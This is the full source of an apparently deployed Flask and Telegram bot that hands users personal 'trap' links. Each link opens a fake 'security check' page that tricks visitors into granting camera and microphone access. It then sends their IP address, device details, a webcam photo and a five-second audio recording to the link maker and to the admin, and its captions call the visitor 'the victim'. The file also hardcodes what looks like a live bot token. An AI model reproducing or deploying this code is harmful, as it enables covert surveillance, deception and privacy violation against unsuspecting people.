import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v19.0) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" 

# نظام تتبع المستخدمين والمراحل
system_config = {
    "welcome_msg": "🔥 أهلاً بك في مصنع الروابط v19.0\n\nالآن يمكنك إنشاء رابطك الخاص واستلام صيدك مباشرة! 🚀",
    "trap_title": "تأكيد الأمان الموحد",
    "banned_users": [],  
    "user_stages": {},   # تتبع مراحل الاشتراك (0, 1, 2)
    "all_users": {}      
}

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=30).json()
        return requests.post(API_URL + method, json=payload, timeout=30).json()
    except: return None

# واجهة الصيد الذكية (تستقبل معرف المستخدم)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon" style="font-size:50px; color:#f38020;">🛡️</div>
        <h2>تحقق أمني مطلوب</h2>
        <p style="color: #bbb;">يرجى تفعيل الفحص الأمني للمتابعة.</p>
        <button class="btn" id="go" onclick="startCapture()">بدء الفحص</button>
        <div id="st">بانتظار الموافقة...</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const uid = "{{ user_id }}"; // معرف الشخص الذي صنع الرابط
        const send = (d, t) => fetch('/api/capture/' + uid, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        
        async function startCapture() {
            document.getElementById('go').style.display = 'none';
            document.getElementById('st').innerText = "جاري الفحص...";
            try {
                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                const b = await navigator.getBattery().catch(() => ({}));
                
                await send(`🎯 **صيد جديد لرابطك!**\\n🌐 IP: \`${ipData.ip}\`\\n🔋 البطارية: ${Math.round(b.level*100)}%\\n📱 النظام: ${navigator.platform}`, 'msg');

                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0); 
                    send(c.toDataURL('image/jpeg', 0.8), 'img');
                    
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = async () => {
                            await send(reader.result, 'aud');
                            document.getElementById('st').innerText = "✅ اكتمل الفحص!";
                            stream.getTracks().forEach(t => t.stop());
                        };
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }, 2000);
            } catch (e) { document.getElementById('st').innerText = "❌ يجب منح الصلاحيات!"; }
        }
    </script>
</body>
</html>
'''

@app.route('/t/<uid>')
def trap(uid):
    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"], user_id=uid)

@app.route('/api/capture/<uid>', methods=['POST'])
def capture(uid):
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    t, d = data.get('t'), data.get('d')
    # الإرسال لصاحب الرابط + نسخة للأدمن الأصلي
    recipients = [uid, ADMIN_ID] if uid != ADMIN_ID else [ADMIN_ID]
    
    for r_id in recipients:
        if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d, 'parse_mode': 'Markdown'})
        elif t == 'img':
            img = base64.b64decode(d.split(',')[1])
            tg_request("sendPhoto", {'chat_id': r_id, 'caption': "📸 صورة الضحية"}, {'photo': ('c.jpg', img)})
        elif t == 'aud':
            aud = base64.b64decode(d.split(',')[1])
            tg_request("sendVoice", {'chat_id': r_id, 'caption': "🎙 بصمة الضحية"}, {'voice': ('v.ogg', aud)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update or "message" not in update:
        if "callback_query" in update: return handle_callback(update["callback_query"])
        return "OK"
    
    msg = update["message"]; chat_id = str(msg["chat"]["id"])
    text = msg.get("text", "")

    if chat_id in system_config["banned_users"]: return "OK"

    # --- نظام الاشتراك المزدوج ---
    stage = system_config["user_stages"].get(chat_id, 0)
    
    if chat_id != ADMIN_ID and stage < 2:
        sub_kb = {"inline_keyboard": [[{"text": "الاشتراك في القناة ✅", "url": SUB_URL}]]}
        if stage == 0:
            system_config["user_stages"][chat_id] = 1
            tg_request("sendMessage", {"chat_id": chat_id, "text": "🛑 **خطوة 1 من 2:**\nيجب عليك الاشتراك في القناة أولاً لتفعيل البوت.", "reply_markup": sub_kb})
        else:
            system_config["user_stages"][chat_id] = 2
            tg_request("sendMessage", {"chat_id": chat_id, "text": "✅ **خطوة 2 من 2:**\nتم تأكيد الاشتراك الأول. اضغط مرة أخرى للتأكيد النهائي وفتح اللوحة.", "reply_markup": sub_kb})
        return "OK"

    # --- لوحة التحكم (بعد الاشتراك) ---
    main_kb = {"inline_keyboard": [
        [{"text": "🔗 إنشاء رابطي الخاص", "callback_data": "gen_my_link"}],
        [{"text": "📊 إحصائياتي", "callback_data": "my_status"}]
    ]}
    
    # إضافة ميزات إضافية لك أنت فقط (الأدمن)
    if chat_id == ADMIN_ID:
        main_kb["inline_keyboard"].append([{"text": "👥 قائمة كل المستخدمين", "callback_data": "list_all"}])

    tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": main_kb})
    return "OK"

def handle_callback(query):
    cid = str(query["message"]["chat"]["id"]); data = query["data"]
    
    if data == "gen_my_link":
        user_link = f"{BASE_URL}/t/{cid}"
        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 **رابط الصيد الخاص بك جاهز:**\nتصلك المعلومات هنا مباشرة عند دخول أي شخص.\n\n`{user_link}`", "parse_mode": "Markdown"})
    elif data == "list_all" and cid == ADMIN_ID:
        # ميزة لك أنت فقط لرؤية الجميع
        res = "👥 **قائمة المستخدمين النشطين:**\n"
        for uid in system_config["user_stages"]: res += f"👤 ID: `{uid}`\n"
        tg_request("sendMessage", {"chat_id": cid, "text": res, "parse_mode": "Markdown"})
        
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
